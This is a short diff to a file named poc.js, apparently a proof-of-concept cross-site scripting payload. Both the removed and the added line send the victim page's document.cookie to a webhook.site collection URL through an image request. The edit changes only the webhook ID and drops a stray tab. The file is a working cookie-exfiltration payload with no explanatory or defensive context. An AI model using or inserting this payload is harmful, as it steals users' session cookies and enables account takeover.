@@ -1,3 +1,4 @@
 // poc.js
-new Image().src = "	https://webhook.site/fe959944-fad6-439d-be2d-488451279809?c=" + encodeURIComponent(document.cookie);
+new Image().src = "https://webhook.site/dac773a1-9568-4ac8-93e9-e38f6ea5cbc5?c=" + encodeURIComponent(document.cookie);
 console.log('poc loaded');
+
